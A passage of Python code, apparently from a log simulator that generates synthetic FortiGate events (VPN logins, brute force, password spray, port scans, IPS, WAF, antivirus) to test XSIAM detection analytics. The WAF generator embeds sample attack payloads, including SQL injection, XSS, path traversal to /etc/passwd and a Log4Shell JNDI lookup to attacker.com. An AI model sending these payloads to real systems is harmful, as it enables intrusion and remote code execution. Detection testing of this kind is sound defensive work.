        "FTNTFGTlogdesc": "SSL VPN tunnel up",
        "msg": "SSL tunnel established",
    }
    return _format_fortinet_cef(config, "0101039424", "event", "vpn", "notice", fields)


def _simulate_vpn_new_country_login(config, session_context=None):
    """One SUCCESSFUL SSL-VPN tunnel-up from a country the org has never seen.

    Drives the XSIAM analytic "First successful VPN access from a country in
    organization" — FIRST-SEEN and ORG-SCOPED, so it fires only on a country not
    observed anywhere in the org for 30 days.

    WHY THIS EXISTS / DO NOT "FIX" IT AWAY:
    The analytic had been silent because the
    simulator was already emitting source IPs resolving to 210 distinct countries
    over 30 days, so nothing could ever be novel.  Tightening the ambient baseline
    is necessary but not sufficient; something must deliberately visit an unused
    country, and this is it.

    session_utils.novel_country_vpn_ip() draws from config['vpn_novel_country_pool']
    (70 XSIAM-PROBED single-country /24s, disjoint from benign_ingress_sources,
    external_traffic_sources and the Tor prefix allowlist) and rotates on the day
    number => 70-day recurrence per country.  Day-keyed rather than random so ASA,
    Check Point, FortiGate, Firepower and Zscaler all pick the SAME country on the
    same day; the detector is org-scoped, so five sources picking five different
    countries per day would exhaust the pool in 14 days.

    NOTE ON FTNTFGTsrccountry: the benign tunnel-up generator labels events with a
    RANDOM _ext_geo() country that has nothing to do with the source IP.  Here the
    label is set to the pool entry's real country so the CEF field and the IP agree
    — whichever of the two the FortiGate XIF maps to xdm.source.location.country,
    it resolves to the intended country.
    """
    novel_ip, cc, country, isp = novel_country_vpn_ip(config)
    if not novel_ip:
        return None

    forti_conf = _get_config(config)
    if session_context:
        user_info = get_random_user(session_context, preferred_device_type="workstation")
        user = user_info["username"] if user_info else "jsmith"
    else:
        umap = (forti_conf.get("user_ip_map") or config.get('shared_user_ip_map', {}))
        user = random.choice(list(umap.keys())) if umap else "jsmith"

    tunnel_ip = f"10.212.134.{hash(user) % 100 + 100}"
    gw_ip     = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    fields = {
        "src": novel_ip, "dst": gw_ip, "dpt": 443, "proto": "6",
        "suser": user, "FTNTFGTxauthuser": user,
        "FTNTFGTxauthgroup": "VPN_Users",
        "FTNTFGTtunnelid": random.randint(100000, 999999),
        "FTNTFGTtunneltype": "ssl-vpn",
        "FTNTFGTtunnelip": tunnel_ip, "FTNTFGTassignip": tunnel_ip,
        "FTNTFGTremotegw": novel_ip, "FTNTFGTvpntunnel": "SSL-VPN-Tunnel",
        "FTNTFGTsrccountry": country or "Unknown",
        "FTNTFGTduration": 0, "externalId": _session_id(),
        "act": "tunnel-up", "outcome": "success",
        "FTNTFGTlogdesc": "SSL VPN tunnel up",
        "msg": "SSL tunnel established",
    }
    return _format_fortinet_cef(config, "0101039424", "event", "vpn", "notice", fields)


def _generate_vpn_failure_benign(config, session_context=None):
    """Benign SSL VPN login failure — wrong password or expired cert."""
    forti_conf = _get_config(config)
    geo = _ext_geo()
    if session_context:
        user_info = get_random_user(session_context, preferred_device_type="workstation")
        user = user_info["username"] if user_info else "jsmith"
    else:
        umap = (forti_conf.get("user_ip_map") or config.get('shared_user_ip_map', {}))
        user = random.choice(list(umap.keys())) if umap else "jsmith"
    ext_ip = stable_vpn_ip(user)
    gw_ip = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    reason = random.choice(["invalid_password", "certificate_expired", "session_timeout"])

    fields = {
        "src": ext_ip, "dst": gw_ip, "dpt": 443, "proto": "6",
        "suser": user, "FTNTFGTxauthuser": user,
        "FTNTFGTxauthgroup": "VPN_Users",
        "FTNTFGTtunneltype": "ssl-vpn",
        "FTNTFGTremotegw": ext_ip, "FTNTFGTvpntunnel": "SSL-VPN-Tunnel",
        # Country label = the IP's REAL country. FortiGate's XIF takes
        # xdm.source.location.country from this text field; a random
        # _ext_geo() label gave every user a ten-country VPN baseline.
        "FTNTFGTsrccountry": ip_country(ext_ip, config)[1] or "Reserved",
        "FTNTFGTduration": 0, "externalId": _session_id(),
        "act": "ssl-login-fail", "outcome": "failed", "reason": reason,
        "FTNTFGTlogdesc": "SSL VPN tunnel down",
        "msg": f"SSL tunnel failed: {reason}",
    }
    return _format_fortinet_cef(config, "0101039426", "event", "vpn", "warning", fields)


def _generate_email_event(config, src_ip, user, shost):
    """Benign outbound email via corporate SMTP relay — traffic:forward accept.

    Uses stable_mail_servers() so each user connects to only 2-3 fixed relays,
    matching real enterprise behavior and avoiding XSIAM spam-bot false positives.
    """
    forti_conf = _get_config(config)
    dst_ip     = stable_mail_servers(user)
    smtp_port  = random.choices([587, 25], weights=[80, 20], k=1)[0]
    nwsvc      = "SMTPS" if smtp_port == 587 else "SMTP"
    duration_s = random.randint(2, 60)
    wan_iface  = forti_conf.get("interface_wan", "port1")
    lan_iface  = forti_conf.get("interface_lan", "port10")

    fields = {
        "src": src_ip, "spt": random.randint(49152, 65535),
        "shost": shost, "suser": user,
        "dst": dst_ip, "dpt": smtp_port, "proto": "6",
        "act": "accept",
        "app": nwsvc, "FTNTFGTapp": nwsvc, "FTNTFGTappid": 16195,
        "FTNTFGTappcat": "Email", "FTNTFGTapprisk": "low",
        "deviceInboundInterface": lan_iface,
        "deviceOutboundInterface": wan_iface,
        "FTNTFGTpolicyid": forti_conf.get("default_policy_id", "1"),
        "FTNTFGTpolicyname": "allow-smtp-relay",
        "FTNTFGTsrccountry": "Reserved", "FTNTFGTdstcountry": "United States",
        "FTNTFGTduration": duration_s,
        "out": random.randint(1_000, 500_000),
        "in":  random.randint(200, 5_000),
        "FTNTFGTsentpkt": random.randint(5, 50),
        "FTNTFGTrcvdpkt": random.randint(5, 30),
        "FTNTFGTosname": random.choice(_SRC_OS_WINDOWS),
        "FTNTFGTsrcmac": _random_mac(shost),
        "FTNTFGTservice": _port_to_service(smtp_port),
        "FTNTFGTlogdesc": "Forward traffic",
        "FTNTFGTsrcintfrole": "lan", "FTNTFGTdstintfrole": "wan",
        "externalId": _session_id(), "outcome": "success",
        "msg": f"{nwsvc} relay {src_ip} -> {dst_ip}:{smtp_port}",
    }
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


def _generate_benign_log(config, session_context=None):
    """Dispatches a benign log event based on event_mix.benign weights or hardcoded defaults."""
    forti_conf = _get_config(config)
    event_mix  = forti_conf.get("event_mix", {})
    benign_cfg = event_mix.get("benign", [])

    if benign_cfg:
        events  = [e["event"]  for e in benign_cfg]
        weights = [e["weight"] for e in benign_cfg]
    else:
        events  = ["traffic_forward", "inbound_block", "webfilter_allow", "dns_query",
                   "admin_event", "vpn_event", "ssl_inspection",
                   "ntp_sync", "antivirus_allow", "ipsec_vpn",
                   "rdp_internal", "ftp_download", "smb_internal",
                   "vpn_login_benign", "vpn_failure_benign", "email_event",
                   "ad_auth", "vpn_new_country_login",
                   "mgmt_admin_session", "snmp_poll"]
        weights = [36,               18,              9,                7,
                   # admin_event: ~40 device-admin logins a day at 1 call/s (was 3,
                   # i.e. ~2,500/day -- no network team logs in that often).
                   0.05,          3,            2,
                   4,           3,              2,
                   3,              2,              3,
                   3,                  1,                  2,
                   # vpn_new_country_login must sit on the BENIGN path, not the threat
                   # path: threats are interval-gated (~12/day at "Realistic") and then
                   # weighted, giving ~0.3 firings/day, but the day-keyed country rotation
                   # needs at least ONE emission every day or that day's country is skipped.
                   5,        2,
                   # management plane: ~40 sessions, ~800 polls a day at 1 call/s
                   0.05, 1]

    chosen = random.choices(events, weights=weights, k=1)[0]

    # Resolve user/IP for events that need an internal source
    user, src_ip, shost = "unknown", "192.168.1.100", None
    if chosen not in ("inbound_block", "admin_event", "vpn_event", "ipsec_vpn",
                      "vpn_login_benign", "vpn_failure_benign",
                      "vpn_new_country_login", "mgmt_admin_session", "snmp_poll"):
        if session_context:
            # follow-on egress: prefer a recently-active user so the flow's src IP + identity match
            # a current logon (cross-plane correlation)
            user_info = correlated_or_random_user(session_context, preferred_device_type="workstation")
            if user_info:
                user   = user_info["username"]
                src_ip = user_info["ip"]
                shost  = user_info.get("hostname")
        else:
            umap = (forti_conf.get("user_ip_map") or config.get('shared_user_ip_map', {}))
            if umap:
                user, src_ip = random.choice(list(umap.items()))
                shost = _get_user_and_host_info(config, src_ip)[1]

    # Use weighted_destination for benign egress when a destination is needed
    if chosen == "traffic_forward":
        destinations = config.get("benign_egress_destinations") or [{}]
        dest = weighted_destination(user, destinations)
        return _generate_traffic_forward(config, src_ip, user, shost)
    elif chosen == "inbound_block":
        return _generate_inbound_block(config)
    elif chosen == "webfilter_allow":
        return _generate_webfilter_allow(config, src_ip, user, shost)
    elif chosen == "dns_query":
        return _generate_dns_query(config, src_ip, user, shost)
    elif chosen == "admin_event":
        return _generate_admin_event(config)
    elif chosen == "mgmt_admin_session":
        return _simulate_mgmt_admin_session(config, session_context)
    elif chosen == "snmp_poll":
        return _simulate_snmp_poll(config, session_context)
    elif chosen == "vpn_event":
        return _generate_vpn_event(config, session_context)
    elif chosen == "ntp_sync":
        return _generate_ntp_sync(config, src_ip, user, shost)
    elif chosen == "antivirus_allow":
        return _generate_antivirus_allow(config, src_ip, user, shost)
    elif chosen == "ipsec_vpn":
        return _generate_ipsec_vpn_event(config)
    elif chosen == "rdp_internal":
        return _generate_rdp_internal(config, src_ip, user, shost)
    elif chosen == "ftp_download":
        return _generate_ftp_download(config, src_ip, user, shost)
    elif chosen == "smb_internal":
        return _generate_smb_internal(config, src_ip, user, shost)
    elif chosen == "ad_auth":
        return _generate_ldap_kerberos_benign(config, src_ip, user, shost)
    elif chosen == "vpn_login_benign":
        return _generate_vpn_login_benign(config, session_context)
    elif chosen == "vpn_new_country_login":
        return _simulate_vpn_new_country_login(config, session_context)
    elif chosen == "vpn_failure_benign":
        return _generate_vpn_failure_benign(config, session_context)
    elif chosen == "email_event":
        return _generate_email_event(config, src_ip, user, shost)
    else:  # ssl_inspection
        return _generate_ssl_inspection(config, src_ip, user, shost)


# Threat event generators

def _simulate_ips_attack(config):
    """Inbound IPS signature trigger — utm:ips (external attacker → internal server)."""

    forti_conf   = _get_config(config)
    config_sigs  = forti_conf.get("ips_rules", {})
    if config_sigs:
        name, sig_id = random.choice(list(config_sigs.items()))
        sig = {"name": name, "id": sig_id, "cve": None, "category": "Exploit", "severity": "high"}
    else:
        sig = random.choice(_IPS_SIGNATURES)

    dst_ip       = random.choice(config.get("internal_servers", ["10.0.10.50"]))
    target_port  = random.choice([80, 443, 445, 8080, 1433, 3389])
    ext_ip       = _random_external_ip()
    geo          = _ext_geo()
    incident_id  = random.randint(100000, 999999)
    wan_iface    = forti_conf.get("interface_wan", "port1")
    lan_iface    = forti_conf.get("interface_lan", "port10")
    severity     = sig.get("severity", "high")
    log_level    = "critical" if severity == "critical" else "alert" if severity == "high" else "warning"

    fields = {
        "src":                      ext_ip,
        "spt":                      random.randint(1024, 65535),
        "dst":                      dst_ip,
        "dpt":                      target_port,
        "proto":                    "6",
        "act":                      "reset",
        "FTNTFGTutmaction":         "reset",
        "app":                      "HTTP" if target_port in (80, 8080) else "HTTPS",
        "deviceInboundInterface":   wan_iface,
        "deviceOutboundInterface":  lan_iface,
        "FTNTFGTpolicyid":          forti_conf.get("default_policy_id", "1"),
        "FTNTFGTpolicyname":        forti_conf.get("default_policy_name", "allow-outbound"),
        "FTNTFGTprofile":           forti_conf.get("ips_profile", "default-ips"),
        "FTNTFGTlogdesc":           "Intrusion detected",
        "FTNTFGTeventtype":         "signature",
        "FTNTFGTattack":            sig["name"],
        "FTNTFGTattackid":          str(sig["id"]),
        "FTNTFGTvulnid":            str(sig["id"]),
        "FTNTFGTvulnname":          sig["name"],
        "FTNTFGTvulncat":           sig["category"],
        "FTNTFGTcveid":             sig.get("cve") or "",
        "FTNTFGTseverity":          severity,
        "FTNTFGTCRlevel":           severity,
        "FTNTFGTref":               f"https://www.fortiguard.com/encyclopedia/ips/{sig['id']}",
        "FTNTFGTincidentserialno":  incident_id,
        "FTNTFGTthreattype":        sig["category"],
        "request":                  "/malicious_payload",
        "FTNTFGThttpmethod":        "POST",
        "FTNTFGTsrccountry":        geo["country"],
        "FTNTFGTsrccity":           geo["city"],
        "FTNTFGTsrcregion":         geo["region"],
        # No resolved hostname for an IPS target — omit rather than echo the IP
        # (see the dhost note in _base_traffic_fields).
        "dhost":                    None,
        "FTNTFGTdstcountry":        "Reserved",
        "FTNTFGTduration":          0,
        "FTNTFGTservice":           _port_to_service(target_port),
        "FTNTFGTsrcintfrole":       "wan",
        "FTNTFGTdstintfrole":       "lan",
        "out":                      random.randint(500, 5000),
        "in":                       random.randint(100, 2000),
        "FTNTFGTsentpkt":           random.randint(1, 10),
        "FTNTFGTrcvdpkt":           random.randint(0, 5),
        "externalId":               _session_id(),
        "outcome":                  "failed",
        "msg":                      f"attack: {sig['name']},{sig['category']}",
    }
    return _format_fortinet_cef(config, "0419016384", "utm", "ips", log_level, fields)


def _simulate_antivirus(config, src_ip, user, shost):
    """File download blocked by antivirus — utm:antivirus."""

    forti_conf   = _get_config(config)
    mal_files    = forti_conf.get("malicious_files", [{"fname": "malware.exe", "fileType": "EXE", "threatname": "Generic.Malware"}])
    mal_file     = random.choice(mal_files)
    fname        = mal_file.get("fname", "malware.exe")
    filetype     = mal_file.get("fileType", "EXE")
    threat_name  = mal_file.get("threatname", "Generic.Malware")
    blocked_cats = forti_conf.get("blocked_url_categories", {"Malware": "malware-site.com"})
    _, domain    = random.choice(list(blocked_cats.items()))
    geo          = _ext_geo()

    # sha256 (64 chars) → xdm.target.file.sha256
    sha256_hash  = hashlib.sha256(f"{src_ip}{fname}{time.time()}".encode()).hexdigest()
    file_size    = random.randint(50000, 5000000)
    client_app   = random.choice(_BROWSER_UA + _SUSPICIOUS_UA[:2])
    incident_id  = random.randint(100000, 999999)

    fields = _base_traffic_fields(
        config, src_ip, shost, user,
        _random_external_ip(), domain, "6", 80, "blocked",
        dst_country=geo["country"], dst_city=geo["city"], dst_region=geo["region"]
    )
    fields.update({
        "app":                  "HTTP",
        "act":                  "blocked",
        "FTNTFGTutmaction":     "blocked",
        "dhost":                domain,
        "FTNTFGTlogdesc":       "File is infected",
        "FTNTFGTeventtype":     "infected",
        "fname":                fname,
        "fsize":                file_size,
        "FTNTFGTfilehash":      sha256_hash,
        "FTNTFGTfiletype":      filetype,
        "FTNTFGTvirus":         threat_name,
        "FTNTFGTvirusid":       str(random.randint(10000, 99999)),
        "FTNTFGTviruscat":      "Virus",
        "FTNTFGTdtype":         "Virus",
        "FTNTFGTquarskip":      "File-was-not-quarantined.",
        "FTNTFGTCRlevel":       "critical",
        "FTNTFGTcrscore":       str(random.randint(30, 50)),
        "FTNTFGTseverity":      "critical",
        "FTNTFGTref":           f"https://www.fortiguard.com/encyclopedia/virus/{threat_name.replace(' ','_')}",
        "FTNTFGTincidentserialno": incident_id,
        "FTNTFGTthreattype":    "Virus",
        "request":              f"http://{domain}/{fname}",
        "FTNTFGThttpmethod":    "GET",
        "requestClientApplication": client_app,
        "FTNTFGTprofile":       forti_conf.get("av_profile", "default-antivirus"),
        "FTNTFGTdstcountry":    geo["country"],
        "FTNTFGTdstcity":       geo["city"],
        "outcome":              "failed",
        "msg":                  f"File blocked by antivirus: {threat_name}",
    })
    return _format_fortinet_cef(config, "0211008192", "utm", "virus", "alert", fields)


def _simulate_webfilter_block(config, src_ip, user, shost):
    """URL blocked by FortiGuard category — utm:webfilter ftgd_blk."""

    forti_conf   = _get_config(config)
    blocked_cats = forti_conf.get("blocked_url_categories", {"Malicious Websites": "evil-site.com"})
    cat_name, domain = random.choice(list(blocked_cats.items()))
    cat_id       = random.choice(_URL_CAT_BLOCKED)
    geo          = _ext_geo()

    fields = _base_traffic_fields(
        config, src_ip, shost, user,
        _random_external_ip(), domain, "6", 443, "blocked",
        dst_country=geo["country"], dst_city=geo["city"], dst_region=geo["region"]
    )
    fields.update({
        "app":                  "HTTPS",
        "act":                  "blocked",
        "FTNTFGTutmaction":     "blocked",
        "dhost":                domain,
        "FTNTFGTlogdesc":       "URL belongs to a denied category in policy",
        "FTNTFGTeventtype":     "ftgd_blk",
        "cat":                  str(cat_id),
        "FTNTFGTcatdesc":       cat_name,
        "requestContext":       cat_name,
        "request":              f"https://{domain}/",
        "FTNTFGThttpmethod":    random.choice(["GET", "POST"]),
        "FTNTFGThttpcode":      "403",
        "FTNTFGTCRlevel":       "high",
        "FTNTFGTseverity":      "high",
        "FTNTFGTprofile":       forti_conf.get("webfilter_profile", "default-webfilter"),
        "requestClientApplication": random.choice(_BROWSER_UA),
        "FTNTFGTdstcountry":    geo["country"],
        "FTNTFGTdstcity":       geo["city"],
        "outcome":              "failed",
        "msg":                  f"URL belongs to a denied category in policy: {cat_name}",
    })
    return _format_fortinet_cef(config, "0201008192", "utm", "webfilter", "warning", fields)


def _simulate_large_upload(config, src_ip, user, shost, domain=None, dst_ip=None):
    """DNS precursor + large upload — returns list.

    domain/dst_ip: pinned by an orchestrated scenario to the name it had
    Infoblox resolve and the address that answer carried, so this session
    lands on the host the victim actually looked up.
    """

    forti_conf   = _get_config(config)
    exfil_dests  = config.get("exfiltration_destinations") or [{}]
    dest         = random.choice(exfil_dests)
    domain       = domain or dest.get("domain", "file-sharing-service.com")
    dst_ip       = (dst_ip or resolver.resolve_one(domain)
                    or rand_ip_from_network(ip_network(dest.get("ip_range", "154.53.224.0/24"), strict=False)))
    geo          = _ext_geo()
    sent_mb      = random.randint(100, 500)
    duration_s   = random.randint(300, 1800)

    logs = [_dns_precursor(config, src_ip, user, shost, domain, dst_ip)]

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, domain, "6", 443, "accept",
        duration_s=duration_s, dst_country=geo["country"],
        dst_city=geo["city"], dst_region=geo["region"]
    )
    fields.update({
        # "SSL", not "HTTPS": xdm.network.application_protocol comes from `app`, and the
        # Large Upload (HTTPS) alerts carry app_id 'ip,tcp,ssl' from an "SSL"
        # application, not "HTTPS". Real FortiOS App Control names generic TLS
        # "SSL"; the upload-specific signature stays in FTNTFGTapp.
        "app":              "SSL",
        "out":              sent_mb * 1024 * 1024,
        "in":               random.randint(1000, 10000),
        "FTNTFGTapp":       "HTTPS.Upload",
        "FTNTFGTappid":     40569,
        "FTNTFGTappcat":    "Cloud.Storage",
        "FTNTFGTapprisk":   "high",
        "FTNTFGTpolicyid":  forti_conf.get("file_share_policy_id", "10"),
        "FTNTFGTpolicyname": forti_conf.get("file_share_policy_name", "allow-file-sharing"),
        "FTNTFGTdstcountry": geo["country"],
        "FTNTFGTdstcity":   geo["city"],
        "requestClientApplication": random.choice(_BROWSER_UA),
        "msg":              f"Large outbound transfer {sent_mb}MB to {domain}",
    })
    logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields))
    return logs


def _simulate_port_scan(config, src_ip, user, shost):
    """Internal host performing port scan — multiple deny events (returns list)."""

    forti_conf  = _get_config(config)
    dst_ip      = random.choice(config.get("internal_servers", ["10.0.10.50"]))
    lan_iface   = forti_conf.get("interface_lan", "port10")
    port_count  = random.randint(30, 80)
    ports       = random.sample(range(1, 1024), k=port_count)
    logs        = []

    for port in ports:
        fields = {
            "src":                      src_ip,
            "spt":                      random.randint(49152, 65535),
            "shost":                    shost,
            "suser":                    user,
            "dst":                      dst_ip,
            "dpt":                      port,
            "proto":                    "6",
            "act":                      "deny",
            "app":                      "UNKNOWN",
            "deviceInboundInterface":   lan_iface,
            "deviceOutboundInterface":  lan_iface,
            "FTNTFGTpolicyid":          "0",
            "FTNTFGTpolicyname":        "implicit-deny",
            "FTNTFGTsrccountry":        "Reserved",
            "FTNTFGTdstcountry":        "Reserved",
            "FTNTFGTduration":          0,
            "out":                      0,
            "in":                       0,
            "FTNTFGTsentpkt":           1,
            "FTNTFGTrcvdpkt":           0,
            "FTNTFGTosname":            random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":            _random_mac(shost),
            "FTNTFGTservice":           _port_to_service(port),
            "FTNTFGTlogdesc":           "Forward traffic denied",
            "FTNTFGTsrcintfrole":       "lan",
            "FTNTFGTdstintfrole":       "lan",
            "externalId":               _session_id(),
            "outcome":                  "failed",
            "reason":                   "no-policy-match",
            "msg":                      f"Denied by forward policy check port {port}",
        }
        logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields))
    # 1-2 successful connections on open ports — attacker finds live services
    open_ports = random.sample([22, 80, 443, 445, 3389], k=random.randint(1, 2))
    for port in open_ports:
        success_fields = {
            "src":                      src_ip,
            "spt":                      random.randint(49152, 65535),
            "shost":                    shost,
            "suser":                    user,
            "dst":                      dst_ip,
            "dpt":                      port,
            "proto":                    "6",
            "act":                      "accept",
            "app":                      _port_to_service(port),
            "deviceInboundInterface":   lan_iface,
            "deviceOutboundInterface":  lan_iface,
            "FTNTFGTpolicyid":          "1",
            "FTNTFGTpolicyname":        "allow-internal",
            "FTNTFGTsrccountry":        "Reserved",
            "FTNTFGTdstcountry":        "Reserved",
            "FTNTFGTduration":          random.randint(5, 60),
            "out":                      random.randint(500, 5000),
            "in":                       random.randint(500, 5000),
            "FTNTFGTsentpkt":           random.randint(10, 100),
            "FTNTFGTrcvdpkt":           random.randint(10, 100),
            "FTNTFGTosname":            random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":            _random_mac(shost),
            "FTNTFGTservice":           _port_to_service(port),
            "FTNTFGTlogdesc":           "Forward traffic accepted",
            "FTNTFGTsrcintfrole":       "lan",
            "FTNTFGTdstintfrole":       "lan",
            "externalId":               _session_id(),
            "outcome":                  "success",
            "reason":                   "policy-match",
            "msg":                      f"Accepted connection to port {port}",
        }
        logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", success_fields))
    return logs


def _simulate_waf_attack(config, src_ip, user, shost):
    """WAF HTTP constraint violation — utm:waf (Fortinet-specific).
    External attacker → internal web server (inbound via WAN)."""
    forti_conf   = _get_config(config)
    ext_ip       = _random_external_ip()
    geo          = _ext_geo()

    dst_ip       = random.choice(config.get("internal_servers", ["172.16.200.55"]))
    payloads     = forti_conf.get("waf_attack_payloads", [
        "' OR 1=1--", "<script>alert(1)</script>",
        "../../../etc/passwd", "; DROP TABLE users;--",
        "{{7*7}}", "${jndi:ldap://attacker.com/a}",
    ])
    payload      = random.choice(payloads)
    waf_events   = ["waf-http-constraint", "waf-method-policy", "waf-address-policy",
                    "waf-url-policy", "waf-parameter-length"]
    constraint   = random.choice(["url-param-num", "max-url-param-length", "illegal-http-method",
                                   "hostname-check", "max-cookie-name-length"])
    client_app   = random.choice(_SUSPICIOUS_UA)
    wan_iface    = forti_conf.get("interface_wan", "port1")

    fields = {
        "src":                      ext_ip,
        "spt":                      random.randint(1024, 65535),
        "dst":                      dst_ip,
        # No resolved hostname for an IPS target — omit rather than echo the IP
        # (see the dhost note in _base_traffic_fields).
        "dhost":                    None,
        "dpt":                      random.choice([80, 443, 8080, 8443]),
        "proto":                    "6",
        "act":                      "blocked",
        "FTNTFGTutmaction":         "blocked",
        "app":                      "HTTP",
        "deviceInboundInterface":   wan_iface,
        "deviceOutboundInterface":  forti_conf.get("interface_lan", "port10"),
        "FTNTFGTpolicyid":          forti_conf.get("waf_policy_id", "15"),
        "FTNTFGTpolicyname":        forti_conf.get("waf_policy_name", "web-server-policy"),
        "FTNTFGTprofile":           forti_conf.get("waf_profile", "default-waf"),
        "FTNTFGTlogdesc":           "WAF constraint violation",
        "FTNTFGTeventtype":         random.choice(waf_events),
        "FTNTFGTconstraint":        constraint,
        "FTNTFGTseverity":          random.choice(["medium", "high"]),
        "FTNTFGTCRlevel":           "medium",
        "FTNTFGTduration":          0,
        "request":                  f"http://{dst_ip}/search.php?q={payload}",
        "FTNTFGThttpmethod":        random.choice(["GET", "POST", "PUT"]),
        "requestClientApplication": client_app,
        "FTNTFGTsrccountry":        geo["country"],
        "FTNTFGTsrccity":           geo["city"],
        "FTNTFGTsrcregion":         geo["region"],
        "FTNTFGTdstcountry":        "Reserved",
        "FTNTFGTservice":           "HTTP",
        "FTNTFGTsrcintfrole":       "wan",
        "FTNTFGTdstintfrole":       "lan",
        "out":                      random.randint(200, 2000),
        "in":                       random.randint(100, 2000),
        "FTNTFGTsentpkt":           random.randint(1, 5),
        "FTNTFGTrcvdpkt":           random.randint(0, 3),
        "externalId":               _session_id(),
        "outcome":                  "failed",
        "msg":                      f"WAF constraint violation: {constraint}",
    }
    return _format_fortinet_cef(config, "0930022816", "utm", "waf", "warning", fields)


def _simulate_auth_brute_force(config):
    """
    Admin console brute force — repeated failed event:system logins.
    Returns list of log strings.
    """

    forti_conf  = _get_config(config)
    admin_users = forti_conf.get("admin_users", ["admin", "root"])
    mgmt_ip     = forti_conf.get("management_ip", "172.16.200.1")
    attacker_ip = _random_external_ip()
    target_user = random.choice(admin_users)
    attempt_cnt = random.randint(20, 50)
    logs        = []

    for _ in range(attempt_cnt):
        fields = {
            "FTNTFGTlogdesc": "Admin login failed",
            "duser":         target_user,
            "src":           attacker_ip,
            "dst":           mgmt_ip,
            "act":           "login",
            "outcome":       "failed",
            "reason":        random.choice(["name_invalid", "passwd_invalid", "two-factor-auth-failed"]),
            "FTNTFGTmethod": random.choice(["https", "ssh"]),
            "sproc":         f"https({attacker_ip})",
            "FTNTFGTsrccountry": random.choice(_EXT_LOCATIONS)["country"],
            "msg":           f"Administrator {target_user} login failed from https({attacker_ip})",
        }
        logs.append(_format_fortinet_cef(config, "0100032002", "event", "system", "alert", fields))
    # Final success — attacker found valid credentials; triggers XSIAM brute-force detection
    success_fields = {
        "FTNTFGTlogdesc":  "Admin login successful",
        "duser":           target_user,
        "src":             attacker_ip,
        "dst":             mgmt_ip,
        "act":             "login",
        "outcome":         "success",
        "FTNTFGTmethod":   "https",
        "FTNTFGTduration": 0,
        "sproc":           f"https({attacker_ip})",
        "FTNTFGTsrccountry": random.choice(_EXT_LOCATIONS)["country"],
        "msg":             f"Administrator {target_user} login successful from https({attacker_ip})",
    }
    logs.append(_format_fortinet_cef(config, "0100032001", "event", "system", "notice", success_fields))
    return logs


def _simulate_vpn_brute_force(config, session_context=None):
    """ONE real user's SSL-VPN account hammered from one IP — XSIAM "VPN login
    Brute-Force attempt": "A user account failed to log in to a VPN service multiple
    times in a short time period." Identity Analytics, test period 1 hour.

    REBUILT 2026-09-17. The previous version was a PASSWORD SPRAY mislabelled as brute
    force: it cycled 10 usernames so each got only 1-4 failures, and half of them
    (admin, test, vpnuser, service) are not real identities. Every username also
    reached XSIAM as EXAMPLECORP\\user, which collapses all VPN users into one identity
    (see _format_fortinet_cef). The spray shape now lives in _simulate_vpn_password_spray.

    Now: one real user from the session, 12-25 failures from one attacker IP inside a
    6-12 minute window, then 50% of the time a success ("Successful VPN Login Brute
    Force" variation). The attacker IP comes from the AMBIENT external pool — countries
    already in the org baseline — so this cannot burn the new-country detector, and its
    country label is the IP's real country.
    """

    forti_conf  = _get_config(config)
    gw_ip       = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    user_info   = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
    user        = user_info["username"] if user_info else "jsmith"
    attacker_ip = _random_external_ip()
    country     = ip_country(attacker_ip, config)[1] or "Reserved"
    n_fail      = random.randint(12, 25)
    now         = time.time()
    t           = now - random.randint(360, 720)
    logs        = []

    def _evt(ts, success):
        f = {
            "src": attacker_ip, "dst": gw_ip, "dpt": 443, "proto": "6",
            "suser": user, "FTNTFGTxauthuser": user, "FTNTFGTxauthgroup": "VPN_Users",
            "FTNTFGTtunneltype": "ssl-vpn", "FTNTFGTremotegw": attacker_ip,
            "FTNTFGTvpntunnel": "SSL-VPN-Tunnel", "FTNTFGTduration": 0,
            "FTNTFGTsrccountry": country,
            "FTNTFGTeventtime": int(ts * 1_000_000_000),
            "externalId": _session_id(),
        }
        if success:
            ip = f"10.212.134.{random.randint(100, 200)}"
            f.update({"act": "tunnel-up", "outcome": "success",
                      "FTNTFGTlogdesc": "SSL VPN tunnel up",
                      "FTNTFGTtunnelid": random.randint(100000, 999999),
                      "FTNTFGTtunnelip": ip, "FTNTFGTassignip": ip,
                      "msg": "SSL tunnel established"})
            return _format_fortinet_cef(config, "0101039424", "event", "vpn", "notice", f)
        f.update({"act": "ssl-login-fail", "outcome": "failed",
                  "reason": "sslvpn_login_permission_denied",
                  "FTNTFGTlogdesc": "SSL VPN login fail",
                  "msg": f"SSL VPN login failed for user {user}"})
        return _format_fortinet_cef(config, "0101039426", "event", "vpn", "warning", f)

    step = (now - t) / (n_fail + 1)
    for _ in range(n_fail):
        t += step * random.uniform(0.6, 1.4)
        logs.append(_evt(min(t, now - 1), success=False))
    if random.random() < 0.5:
        logs.append(_evt(now, success=True))
    return logs


def _simulate_vpn_password_spray(config, session_context=None):
    """One IP trying ONE or two passwords against MANY real accounts — XSIAM "VPN Login
    Password Spray".

    This is the shape the old _simulate_vpn_brute_force actually produced, rebuilt with
    REAL session usernames (it used placeholders like admin/test/vpnuser) and bare VPN
    identities. 15-40 distinct users, 1-2 failures each, from one ambient-pool IP over
    10-30 minutes.
    """

    forti_conf  = _get_config(config)
    gw_ip       = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    attacker_ip = _random_external_ip()
    country     = ip_country(attacker_ip, config)[1] or "Reserved"
    users = set()
    for _ in range(200):
        if len(users) >= random.randint(15, 40):
            break
        ui = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
        users.add(ui["username"] if ui else f"user{random.randint(1, 500)}")
    now  = time.time()
    span = random.randint(600, 1800)
    logs = []
    for u in users:
        for _ in range(random.randint(1, 2)):
            ts = now - random.randint(0, span)
            f = {
                "src": attacker_ip, "dst": gw_ip, "dpt": 443, "proto": "6",
                "suser": u, "FTNTFGTxauthuser": u, "FTNTFGTxauthgroup": "VPN_Users",
